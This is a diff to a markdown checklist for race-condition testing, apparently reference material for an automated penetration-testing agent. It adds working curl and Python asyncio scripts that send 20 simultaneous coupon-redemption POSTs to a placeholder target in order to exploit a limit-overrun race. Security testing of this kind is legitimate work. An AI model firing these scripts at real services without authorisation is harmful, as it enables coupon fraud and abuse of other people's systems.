@@ -42,18 +42,29 @@ behavior.
 
 ### 2. Single-Packet Attack (HTTP/2)
 
-- [ ] Prepare N identical requests
-- [ ] Send all in a single TCP packet using HTTP/2 multiplexing:
+- [ ] Prepare N identical requests via curl config file:
       ```bash
-      curl --parallel --parallel-max 50 \
-        -X POST https://target/redeem-coupon \
-        -d "code=DISCOUNT50" \
-        # Add explicit Cookie/Auth only when testing a second session or override path
-        --url "https://target/redeem-coupon" \
-        --url "https://target/redeem-coupon" \
-        [repeat N times]
+      # Create config file with 20 parallel POST requests
+      for i in $(seq 1 20); do
+        echo "url = https://target/redeem-coupon"
+        echo "request = POST"
+        echo "data = code=DISCOUNT50"
+        echo "next"
+      done > /tmp/race_config.txt
+
+      # Send all simultaneously via HTTP/2 multiplexing
+      curl --parallel --parallel-max 20 -K /tmp/race_config.txt -o /dev/null -w '%{http_code}\n'
       ```
-- [ ] All requests arrive at server simultaneously
+- [ ] Alternative: Python asyncio for precise timing
+      ```python
+      import asyncio, aiohttp
+      async def race():
+          async with aiohttp.ClientSession() as s:
+              tasks = [s.post('https://target/redeem-coupon', data={'code':'DISCOUNT50'}) for _ in range(20)]
+              return await asyncio.gather(*tasks)
+      asyncio.run(race())
+      ```
+- [ ] Count successful responses — more than 1 success = race condition confirmed
 
 ### 3. Turbo Intruder Script
 
@@ -121,4 +132,3 @@ behavior.
 ## Extended Resources
 
 - `agent/references/payloads/race-condition-payloads.md` — HTTP/2 single-packet, limit overrun, multi-endpoint race
-- `agent/references/vuln-checklists/A06-insecure-design.md` — OWASP Top 10:2025 insecure design checklist
